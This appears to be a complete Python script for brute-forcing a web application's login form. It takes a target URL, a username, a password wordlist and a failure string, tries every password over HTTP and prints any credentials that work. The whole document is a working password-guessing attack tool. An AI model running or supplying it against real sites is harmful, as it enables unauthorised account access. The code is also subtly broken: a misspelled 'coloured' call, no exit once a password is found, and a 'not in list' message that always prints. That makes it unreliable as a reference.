import requests
from termcolor import colored

url = input("enter page url ")
username=input("enter username for the account to brutforce ")
passwordfile=input("enter password file to use ")
loginfail=input("enter string that occurs when login fail ")
cookievalue=input("enter cookie value(optional) ")

def cracking(username, url, passwords) :
    for password in passwords:
        password=password.strip()
        print(colored(("trying "+password) , "green"))
        data={"username":username,"password":password,"Login":"submit"}
        if cookievalue != "":
            response = requests.get(url, params={"username": username, "password": password, "Login": "Login"}, cookies={"cookie": cookievalue})

        else:
            response=requests.post(url,data=data)
        
        if loginfail in response.content.decode():
            pass
        else:
            print(colored(("found username "+username) , "blue" ))
            print(coloured(("found password "+password) , "blue" ))



with open(passwordfile, "r") as password_file:
    passwords = password_file.readlines()
    cracking(username, url, passwords)


print("password not in list")
